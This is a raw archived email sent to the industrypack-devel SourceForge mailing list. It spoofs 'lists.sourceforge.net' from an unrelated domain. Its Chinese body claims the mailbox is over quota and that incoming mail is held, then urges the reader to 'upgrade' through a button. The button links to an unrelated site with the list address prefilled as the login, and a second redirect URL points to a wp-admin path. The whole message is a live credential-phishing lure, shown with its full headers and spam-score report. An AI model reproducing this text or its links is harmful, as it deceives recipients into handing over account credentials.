Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 82937704342
	for <lists+industrypack-devel@lfdr.de>; Tue, 16 May 2023 04:10:32 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pyk91-0000rj-0c
	for lists+industrypack-devel@lfdr.de;
	Tue, 16 May 2023 02:10:31 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <Administrator@awe.co.nz>) id 1pyk8y-0000rd-Rj
 for industrypack-devel@lists.sourceforge.net;
 Tue, 16 May 2023 02:10:28 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=vPGf0IWYC+8XnflWH1q/EgVIh2G5Uq2HTMUEiwg9Eug=; b=CTEjTZMmuWUUTxZIn4dJCiZaWS
 BTICnQvgORIQtx/nNv9W/N9xemFASfG/3LV7/aIHwiUbiOGVf44T+4wuL8CYDYxcfCF4ksV01zlcH
 ix1ypwJ0wnKZZZT0JXfdKv6HAOT1BKvXd8sGcXsVDHPjYI8zkBSoiMmDJ3aXnVFO9SzI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=vPGf0IWYC+8XnflWH1q/EgVIh2G5Uq2HTMUEiwg9Eug=; b=H
 K19L89D15b4wDJHOpiZCNeSnJjp+PJHOelmi00WEkFVDutJilQIMEB7SDjnv7FdwnHdyI6vPcYq/L
 3WF6Uzfjg5log0DcFGsJtftXIZwCqodewcNBlC4n1tpg6fEZaT6Djz/WWpdgllM2L8bMWR0oFhzGC
 yrzsxuy/PqXcOFzY=;
Received: from [172.93.185.194] (helo=mta0.awi.co.jp)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pyk8w-0090fe-Rh for industrypack-devel@lists.sourceforge.net;
 Tue, 16 May 2023 02:10:28 +0000
From: "lists.sourceforge.net" <Administrator@awe.co.nz>
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Tue, 16 May 2023 01:50:05 +0000
Message-Id: <160520230550013B364E08CD$0D8F900CAF@awe.co.nz>
X-Spam-Score: 3.2 (+++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  注意力 您的邮箱 industrypack-devel@lists.sourceforge.net
    处于上限阶段， 所有传入的邮件都将处于待处理状态，因为过多的邮件会影响您的工作效率，因此您将无法接�
    [...] 
 
 Content analysis details:   (3.2 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
                             [172.93.185.194 listed in dnsbl-1.uceprotect.net]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 HTML_FONT_SIZE_LARGE   BODY: HTML font size is large
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  0.0 TVD_SPACE_RATIO_MINFP  Space ratio (vertical text obfuscation?)
X-Headers-End: 1pyk8w-0090fe-Rh
Subject: [Industrypack-devel] =?utf-8?b?57Sn5oCl5qC45a6e?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7229729658646772542=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============7229729658646772542==
Content-Type: multipart/alternative; boundary="bS6Q=_uDtTlShJrakST86YGdhsBpFcizvf"

This is a multi-part message in MIME format

--bS6Q=_uDtTlShJrakST86YGdhsBpFcizvf
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


=E6=B3=A8=E6=84=8F=E5=8A=9B

=E6=82=A8=E7=9A=84=E9=82=AE=E7=AE=B1 industrypack-devel@lists.sourcefo=
rge.net =E5=A4=84=E4=BA=8E=E4=B8=8A=E9=99=90=E9=98=B6=E6=AE=B5=EF=BC=8C=
 =E6=89=80=E6=9C=89=E4=BC=A0=E5=85=A5=E7=9A=84=E9=82=AE=E4=BB=B6=E9=83=
=BD=E5=B0=86=E5=A4=84=E4=BA=8E=E5=BE=85=E5=A4=84=E7=90=86=E7=8A=B6=E6=80=
=81=EF=BC=8C=E5=9B=A0=E4=B8=BA=E8=BF=87=E5=A4=9A=E7=9A=84=E9=82=AE=E4=BB=
=B6=E4=BC=9A=E5=BD=B1=E5=93=8D=E6=82=A8=E7=9A=84=E5=B7=A5=E4=BD=9C=E6=95=
=88=E7=8E=87=EF=BC=8C=E5=9B=A0=E6=AD=A4=E6=82=A8=E5=B0=86=E6=97=A0=E6=B3=
=95=E6=8E=A5=E6=94=B6=E9=82=AE=E4=BB=B6=E3=80=82

=E6=88=91=E4=BB=AC=E5=BB=BA=E8=AE=AE=E6=82=A8=E5=8D=87=E7=BA=A7=E9=82=AE=
=E7=AE=B1=E4=BB=A5=E9=87=8D=E7=BD=AE=E6=AD=A3=E5=B8=B8=E4=BD=BF=E7=94=A8=
=E5=B9=B6=E6=8F=90=E9=AB=98=E5=B7=A5=E4=BD=9C=E6=95=88=E7=8E=87=E3=80=82=
=20

=E5=8D=87=E7=BA=A7=E9=82=AE=E7=AE=B1 https://tusjardineros.com/tffd/ch=
osenmopol?login=3Dindustrypack-devel@lists.sourceforge.net

=E8=B0=A2=E8=B0=A2=E6=82=A8=E7=9A=84=E7=90=86=E8=A7=A3=EF=BC=81

lists.sourceforge.net =C2=A92023

--bS6Q=_uDtTlShJrakST86YGdhsBpFcizvf
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
8">
  <title>=E7=B4=A7=E6=80=A5=E6=A0=B8=E5=AE=9E</title>
 </head>
 <body><PRE id=3Dm_-6766056148923864101m_5406693973820841500m_-5444127=
749171617453m_-4338912535920616473m_-1229756607038605065gmail-m_773852=
6901468481435m_5954447935200129863m_-7413718331950251539m_-34821156414=
83421118m_1595297477835602198m_2344168992826749306m_222064068818501183=
3m_-7128244348203283183m_-2281780419401412659m_8044409787950953973m_10=
59461205045779020m_-5927498109248306499m_6975502018925468257m_-6399297=
058994202054m_5030895791376096707gmail-tw-target-text style=3D"WHITE-S=
PACE: pre-wrap; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decor=
ation-thickness: initial; text-decoration-style: initial; text-decorat=
ion-color: initial" dir=3Dltr><PRE id=3Dm_-6766056148923864101m_540669=
3973820841500m_-5444127749171617453m_-4338912535920616473m_-1229756607=
038605065gmail-m_7738526901468481435m_5954447935200129863gmail-m_-7413=
718331950251539m_-3482115641483421118m_1595297477835602198m_2344168992=
826749306m_2220640688185011833m_-7128244348203283183m_-228178041940141=
2659m_8044409787950953973m_1059461205045779020m_-5927498109248306499m_=
6975502018925468257m_-6399297058994202054m_5030895791376096707gmail-tw=
-target-text style=3D"WHITE-SPACE: pre-wrap" dir=3Dltr><FONT style=3D"=
FONT-FAMILY: 'Arial Black'" size=3D6 face=3D"Arial Black">=E6=B3=A8=E6=
=84=8F=E5=8A=9B</FONT><BR></PRE><DIV style=3D"FONT-FAMILY: Arial, Helv=
etica, sans-serif; WHITE-SPACE: normal"><FONT style=3D"FONT-FAMILY: ve=
rdana, sans-serif" face=3D"verdana, sans-serif">=E6=82=A8=E7=9A=84=E9=82=
=AE=E7=AE=B1&nbsp;<B>industrypack-devel@lists.sourceforge.net&nbsp;</B=
>&nbsp;=E5=A4=84=E4=BA=8E=E4=B8=8A=E9=99=90=E9=98=B6=E6=AE=B5=EF=BC=8C=
<WBR> =E6=89=80=E6=9C=89=E4=BC=A0=E5=85=A5=E7=9A=84=E9=82=AE=E4=BB=B6=E9=
=83=BD=E5=B0=86=E5=A4=84=E4=BA=8E=E5=BE=85=E5=A4=84=E7=90=86=E7=8A=B6=E6=
=80=81=EF=BC=8C<WBR>=E5=9B=A0=E4=B8=BA=E8=BF=87=E5=A4=9A=E7=9A=84=E9=82=
=AE=E4=BB=B6=E4=BC=9A=E5=BD=B1=E5=93=8D=E6=82=A8=E7=9A=84=E5=B7=A5=E4=BD=
=9C=E6=95=88=E7=8E=87=EF=BC=8C=E5=9B=A0=E6=AD=A4=E6=82=A8=E5=B0=86=E6=97=
=A0=E6=B3=95=E6=8E=A5=E6=94=B6=E9=82=AE=E4=BB=B6=E3=80=82<FONT size=3D=
4><BR></FONT></FONT></DIV><DIV style=3D"FONT-FAMILY: Arial, Helvetica,=
 sans-serif; WHITE-SPACE: normal"> <FONT style=3D"FONT-FAMILY: verdana=
, sans-serif" face=3D"verdana, sans-serif"><BR></FONT></DIV><DIV style=
=3D"FONT-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: normal"><F=
ONT style=3D"FONT-FAMILY: verdana, sans-serif" face=3D"verdana, sans-s=
erif">=E6=88=91=E4=BB=AC=E5=BB=BA=E8=AE=AE=E6=82=A8=E5=8D=87=E7=BA=A7=E9=
=82=AE=E7=AE=B1=E4=BB=A5=E9=87=8D=E7=BD=AE=E6=AD=A3=E5=B8=B8=E4=BD=BF=E7=
=94=A8=E5=B9=B6=E6=8F=90=E9=AB=98=E5=B7=A5=E4=BD=9C=E6=95=88=E7=8E=87=E3=
=80=82</FONT> <FONT style=3D"FONT-FAMILY: tahoma, sans-serif" size=3D4=
 face=3D"tahoma, sans-serif"><BR></FONT></DIV><DIV style=3D"FONT-FAMIL=
Y: Arial, Helvetica, sans-serif; WHITE-SPACE: normal"><FONT size=3D4><=
SPAN style=3D"FONT-FAMILY: 'arial black', sans-serif"><FONT style=3D"F=
ONT-FAMILY: tahoma, sans-serif" face=3D"tahoma, sans-serif"><BR></FONT=
></SPAN></FONT></DIV><DIV style=3D"FONT-FAMILY: Arial, Helvetica, sans=
-serif; WHITE-SPACE: normal"> &nbsp;<A style=3D"FONT-SIZE: 13px; HEIGH=
T: 58px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f; WIDTH: 118px; BACKGROUND-IMAGE: none; BACKGROUND-REPEAT: repeat; TE=
XT-TRANSFORM: uppercase; BACKGROUND-POSITION: 0% 0%; COLOR: rgb(255,25=
5,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 30px; D=
ISPLAY: inline-block; PADDING-RIGHT: 30px; BACKGROUND-COLOR: rgb(16,17=
3,228); MARGIN-RIGHT: 10px; border-radius: 20px; text-decoration-line:=
 none" href=3D"https://tusjardineros.com/tffd/chosenmopol?login=3Dindu=
strypack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank=
 data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ephrai=
msecurity.com/wp-admin/al/?i%3Di%260%3D%5B%5B-Email-%5D%5D&amp;source=3D=
gmail&amp;ust=3D1679204353474000&amp;usg=3DAOvVaw3qK9o2Jut9tVtx05hKzio=
P">=E5=8D=87=E7=BA=A7=E9=82=AE=E7=AE=B1</A>&nbsp;&nbsp; &nbsp; &nbsp; =
&nbsp;</DIV> <DIV style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal"><BR></DIV><DIV style=3D"FONT-FAMILY: Arial, Helve=
tica, sans-serif; WHITE-SPACE: normal"><FONT style=3D"FONT-FAMILY: ver=
dana, sans-serif" face=3D"verdana, sans-serif">=E8=B0=A2=E8=B0=A2=E6=82=
=A8=E7=9A=84=E7=90=86=E8=A7=A3</FONT>=EF=BC=81</DIV><DIV style=3D"FONT=
-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: normal">lists.sour=
ceforge.net &copy;2023</DIV></PRE></body>
 </html>

--bS6Q=_uDtTlShJrakST86YGdhsBpFcizvf--



--===============7229729658646772542==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7229729658646772542==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7229729658646772542==--


